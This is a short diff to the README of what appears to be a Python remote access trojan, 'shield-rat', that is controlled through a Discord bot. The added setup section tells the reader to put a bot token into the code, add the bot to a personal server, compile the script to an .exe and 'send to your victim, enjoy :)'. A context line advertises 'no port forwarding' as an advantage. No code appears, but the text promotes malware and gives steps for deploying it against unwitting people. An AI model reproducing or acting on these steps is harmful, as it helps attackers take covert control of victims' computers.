@@ -1,5 +1,12 @@
 <h1 align="center">ADVANCED PYTHON DISCORD RAT</h1>
 
+<h2>SETUP</h2>
+<p>STEP 1.Create a discord bot, paste token in to the code</p>
+
+<p>STEP 2.Add a the bot to your personal server</p>
+
+
+<p>STEP 3.compile .py to .exe send to your victim, enjoy :)</p>
 
 <h3>Advantages of shield-rat</h3>
 <p>● no port forwarding</p>
